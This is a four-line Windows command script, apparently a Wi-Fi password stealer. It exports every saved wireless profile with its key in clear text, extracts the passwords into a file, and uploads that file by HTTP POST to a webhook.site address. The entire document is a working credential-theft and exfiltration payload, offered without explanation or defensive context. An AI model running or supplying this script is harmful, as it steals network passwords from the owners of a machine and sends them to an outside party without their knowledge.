cd "$env:LOCALAPPDATA"
netsh wlan export profile key=clear
powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri https://webhook.site/1effb288-1ed1-40f4-a479-1e07b5fa764e -Method POST -InFile Wi-Fi-PASS
